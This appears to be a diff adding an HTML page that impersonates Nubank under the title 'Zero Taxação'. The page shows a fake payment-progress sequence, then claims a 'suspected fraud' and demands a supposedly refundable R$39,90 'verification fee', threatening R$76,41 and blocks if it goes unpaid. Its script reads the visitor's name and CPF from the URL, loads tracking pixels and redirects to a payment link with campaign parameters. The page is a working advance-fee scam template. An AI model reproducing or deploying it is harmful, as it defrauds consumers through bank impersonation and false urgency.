@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="js/latest.html" data-utmify-prevent-subids="" data-utmify-ignore-iframe="" async="" defer=""></script>
+    <link rel="icon" href="images/favicon.html" type="./image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favicon.html">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+        rel="stylesheet">
+
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+    <title>Zero Taxação</title>
+      <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rbelpph67g");
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "673cd18ac1a87f0eeb7b11d4";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+    <div id="content">
+        <style>
+            .navbar {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                background-color: #000000;
+                padding-bottom: 10px;
+                padding-left: 10px;
+            }
+        </style>
+        <nav class="navbar" style="padding-top: 15px;">
+            <div class="menu-icon" style="padding-left: 3%;">
+                <img src="images/nu.webp" style="height: 5vh;" alt="Logo Nubank">
+            </div>
+
+            <div class="logo-central">
+            </div>
+
+            <div class="menu-icon" style="padding-right: 3%;">
+                <span class="material-symbols-outlined"
+                    style="font-size: 30px; padding-right: 10px; color: #ffffff">shopping_cart</span>
+            </div>
+        </nav>
+
+
+        <div class="progress-container">
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar1"></div>
+
+                    <div class="check-container" id="check1">
+                        <img src="../../imgs/success.gif" alt="Animação" id="img1">
+                    </div>
+                </div>
+
+                <p id="text1">Analisando Dados</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar2"></div>
+
+                    <div class="check-container" id="check2">
+                        <img src="../../imgs/success.gif" alt="Animação" id="img2">
+                    </div>
+                </div>
+
+                <p id="text2">Preparando transferência</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar3"></div>
+
+                    <div class="check-container" id="check3">
+                        <img src="../../imgs/success.gif" alt="Animação" id="img3">
+                    </div>
+                </div>
+
+                <p id="text3">Pagamento Efetuado</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar4"></div>
+
+                    <div class="check-container" id="check4">
+                        <img src="../../imgs/success.gif" alt="Animação" id="img4">
+                    </div>
+                </div>
+
+                <p id="text4">Concluido</p>
+            </div>
+        </div>
+
+        <section id="more-information">
+            <h1>ATENÇÃO!</h1>
+
+            <h2>Confirmação necessária</h2>
+
+            <p>
+                Durante a análise do seu pedido, identificamos uma <span class="bold">pendência relacionada à taxa de
+                    verificação</span>, necessária para garantir a segurança da entrega e evitar possíveis fraudes.
+            </p>
+
+            <p>
+                Essa taxa é <span class="bold">reembolsável</span> e será devolvida automaticamente após a confirmação
+                do pagamento.
+            </p>
+
+            <p>Clique no botão abaixo para calcular e regularizar a taxa.</p>
+
+
+            <button id="show-offer" disabled="" style="background-color: #831BD1;">CALCULAR TAXA</button>
+        </section>
+    </div>
+
+    <div id="offer-modal" class="modal">
+        <div class="modal-content">
+
+            <div id="step1">
+                <h1>Verificando pendência</h1>
+
+                <div id="trace" class="progress-bar2"></div>
+
+                <p>Por favor, aguarde enquanto processamos...</p>
+            </div>
+
+            <div id="step2">
+                <p>MOTIVO DA TAXA:</p>
+                <span id="reason" class="bold">SUSPEITA DE FRAUDE</span><br>
+
+                <p>Foi identificada uma <span class="bold2">taxa obrigatória de validação</span> para garantir a
+                    segurança do processo.
+                    Após o pagamento, o valor será <span class="bold2">totalmente reembolsado</span>.</p>
+
+                <h1>REGULARIZE AGORA</h1>
+
+                <p>Efetue o pagamento</p>
+
+                <h1 id="value">R$39,90</h1>
+
+                <a href="#" id="btn001" style="background-color: #831BD1;">REGULARIZAR TAXA</a>
+
+                <p>Atenção: Caso o valor de <span class="bold3">R$39,90</span> não seja quitado, o sistema exigirá o
+                    pagamento integral de
+                    <span class="bold4">R$76,41</span>. O não cumprimento poderá acarretar em bloqueios no processo.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+       
+    </script>
+
+    <script src="js/scripts002.js"></script>
+                    <script>
+       // Função para capturar todos os parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search.substring(1);
+            const pairs = queryString.split('&');
+        
+            pairs.forEach(pair => {
+                const [key, value] = pair.split('=');
+                if (key) {
+                    params[decodeURIComponent(key)] = decodeURIComponent(value || '');
+                }
+            });
+        
+            return params;
+        }
+        
+        // Função para construir a nova URL com os parâmetros
+        function buildUrlWithParams(baseUrl, params) {
+            const queryString = Object.keys(params)
+                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+                .join('&');
+        
+            return `${baseUrl}&${queryString}`;
+        }
+        
+        // Captura todos os botões com a classe 'request-btn'
+        const buttons = document.querySelectorAll('#btn001');
+        
+        // Adiciona um evento de clique a cada botão
+        buttons.forEach(button => {
+            button.addEventListener('click', function(event) {
+                event.preventDefault(); // Impede o comportamento padrão do botão
+        
+                // Captura os parâmetros da URL atual
+                const params = getUrlParams();
+                const urlParams = new URLSearchParams(window.location.search);
+                const nome = urlParams.get('nome')
+                const cpf = urlParams.get('cpf')
+                const valor = urlParams.get('valor')
+                const extractUTMParams = () => {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    return {
+                        utm_source: urlParams.get('utm_source') || '',
+                        utm_campaign: urlParams.get('utm_campaign') || '',
+                        utm_medium: urlParams.get('utm_medium') || '',
+                        utm_content: urlParams.get('utm_content') || '',
+                        utm_term: urlParams.get('utm_term') || '',
+                        subid: urlParams.get('subid') || '',
+                        sid2: urlParams.get('sid2') || '',
+                        subid2: urlParams.get('subid2') || '',
+                        subid3: urlParams.get('subid3') || '',
+                        subid4: urlParams.get('subid4') || '',
+                        subid5: urlParams.get('subid5') || '',
+                        xcod: urlParams.get('xcod') || '',
+                        sck: urlParams.get('sck') || ''
+                    };
+                };
+
+                    const utms = extractUTMParams();
+        
+                // Constrói a nova URL com os parâmetros
+                const newUrl = buildUrlWithParams(`https://google.com`, utms);
+        
+                // Redireciona para a nova URL
+                window.location.href = newUrl;
+            });
+        });
+    </script>
+
+
+
+</body>
+
+</html>
